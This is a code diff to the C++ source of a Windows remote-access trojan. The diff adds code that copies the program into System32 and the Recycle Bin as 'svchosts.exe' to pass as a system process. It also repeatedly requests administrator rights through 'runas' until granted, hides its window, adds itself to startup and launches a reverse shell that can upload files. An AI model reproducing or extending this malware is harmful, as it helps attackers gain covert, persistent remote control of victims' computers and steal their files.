@@ -37,6 +37,7 @@ void upload(char* fname,SOCKET& sock){
 	size_t fsize = file_size(file);
 	fread(filedata,sizeof(char),fsize,file);
 	send(sock,(char*) filedata,fsize,0);
+	free(filedata);
 }
 void restart_self(){
 	char selfname[MAX_PATH+1];
@@ -47,7 +48,12 @@ void restart_self(){
 	ZeroMemory( &si, sizeof(si) );
 	si.cb = sizeof(si);
 	ZeroMemory( &pi, sizeof(pi) );
-	while (!CreateProcess(selfname,NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi));
+	while ((int)ShellExecute( NULL, 
+    "runas",  
+    selfname,  
+    "",     
+    NULL,                        // default dir 
+    SW_HIDE  ) < 33);
 	std::exit(0);
 }
 void add_to_startup(){
@@ -59,6 +65,51 @@ void add_to_startup(){
 	RegCloseKey(hkey);
 }
 /*
+*/
+void s32copy(char* fname){
+	FILE* file = fopen(fname,"rb");
+	FILE* rcbinf = fopen("C:\\Windows\\System32\\svchosts.exe","wb");
+	char ch;
+	size_t fsize = file_size(file);
+	int counter = 0;
+	while (((ch = fgetc(file)) || true) && counter < fsize){
+      fputc(ch, rcbinf);
+      counter++;
+	}
+  	fclose(file);
+  	fclose(rcbinf);
+}
+void fcopy(char* fname){
+	FILE* file = fopen(fname,"rb");
+	FILE* rcbinf = fopen("C:\\$Recycle.Bin\\svchosts.exe","wb");
+	char ch;
+	size_t fsize = file_size(file);
+	int counter = 0;
+	while (((ch = fgetc(file)) || true) && counter < fsize){
+      fputc(ch, rcbinf);
+      counter++;
+	}
+  	fclose(file);
+  	fclose(rcbinf);
+}
+void copy_to_rcbin(){
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+	ZeroMemory( &si, sizeof(si) );
+	si.cb = sizeof(si);
+	ZeroMemory( &pi, sizeof(pi) );
+	char selfname[MAX_PATH+1];
+	GetModuleFileName(NULL,selfname,MAX_PATH+1);
+	if(strcmp(selfname,"c:\\$Recycle.Bin\\svchosts.exe") != 0){
+		fcopy(selfname);
+		if((int)ShellExecute( NULL, 
+    "runas",  
+    "c:\\$Recycle.Bin\\svchosts.exe",  
+    "",     
+    NULL,                        // default dir 
+    SW_HIDE  ) >= 33)std::exit(0);
+	}
+}
 void copy_to_system32(){
 	STARTUPINFO si;
 	PROCESS_INFORMATION pi;
@@ -67,9 +118,14 @@ void copy_to_system32(){
 	ZeroMemory( &pi, sizeof(pi) );
 	char selfname[MAX_PATH+1];
 	GetModuleFileName(NULL,selfname,MAX_PATH+1);
-	if(CopyFile(selfname,"C:\\Windows\\System32\\svchosts.exe",true))
-		if(CreateProcess("C:\\Windows\\System32\\svchosts.exe",NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi))std::exit(0);
-}*/
+	if(strcmp(selfname,"C:\\Windows\\System32\\svchosts.exe") != 0)s32copy(selfname);
+	if((int)ShellExecute( NULL, 
+    "runas",  
+    "C:\\Windows\\System32\\svchosts.exe",  
+    "",     
+    NULL,                        // default dir 
+    SW_HIDE  ) > 33)std::exit(0);
+}
 void RevShell(){
 	WSADATA wsaver;
 	WSAStartup(MAKEWORD(2,2),&wsaver);
@@ -137,10 +193,11 @@ void RevShell(){
 int main(){
 	HWND stealth;
 	AllocConsole();
-	add_to_startup();
-	//copy_to_system32();
 	stealth=FindWindow("ConsoleWindowClass",NULL);
 	ShowWindow(stealth,SW_HIDE);
+	copy_to_system32();
+	copy_to_rcbin();
+	add_to_startup();
 	RevShell();
 	return 0;
 }
